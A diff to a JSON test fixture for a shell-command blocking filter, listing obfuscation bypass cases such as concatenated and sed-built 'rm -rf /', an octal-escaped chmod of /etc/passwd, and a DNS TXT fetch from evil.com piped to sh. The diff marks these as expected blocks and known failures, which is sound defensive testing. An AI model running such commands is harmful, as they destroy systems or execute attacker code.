@@ -59,10 +59,10 @@
       "category": "bypass_attempts",
       "description": "String concatenation to hide rm -rf",
       "command": "r\"m\" -\"r\"f /",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "String concatenation in shell is hard to detect \u2014 should block but may not"
+      "note": "Malicious string-concat rm -rf /. Statically hard to detect — honest FAIL / known bypass."
     },
     {
       "id": "bypass-008",
@@ -119,7 +119,7 @@
       "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "xxd pipe sh bypass \u2014 hard to detect with regex"
+      "note": "xxd pipe sh bypass — hard to detect with regex"
     },
     {
       "id": "bypass-014",
@@ -129,7 +129,7 @@
       "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "openssl base64 pipe sh \u2014 encode variant"
+      "note": "openssl base64 pipe sh — encode variant"
     },
     {
       "id": "bypass-015",
@@ -145,20 +145,20 @@
       "category": "bypass_attempts",
       "description": "Sed-based command obfuscation",
       "command": "echo 'ez -es /' | sed 's/ez/rm -rf/' | sh",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "sed transformation pipe \u2014 hard to detect statically"
+      "note": "Malicious sed-obfuscated rm -rf / piped to sh. Statically undetectable — honest FAIL / known bypass."
     },
     {
       "id": "bypass-017",
       "category": "bypass_attempts",
       "description": "Chmod 777 via octal char escape",
       "command": "chmod \\060\\067\\067\\067 /etc/passwd",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "Octal escape works in shell but regex won't match"
+      "note": "Malicious octal-escape chmod 777 /etc/passwd. Honest FAIL / known bypass."
     },
     {
       "id": "bypass-018",
@@ -177,17 +177,17 @@
       "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "nc pipe bash \u2014 not in current patterns"
+      "note": "nc pipe bash — not in current patterns"
     },
     {
       "id": "bypass-020",
       "category": "bypass_attempts",
       "description": "DNS-based exfiltration pipe",
       "command": "dig +short TXT cmd.evil.com | sh",
-      "expected": "allow",
+      "expected": "block",
       "severity": "high",
       "bypass_methods": [],
-      "note": "DNS pipe shell \u2014 exotic bypass vector"
+      "note": "Malicious DNS-exfil pipe to sh. Honest FAIL / known bypass."
     }
   ]
 }
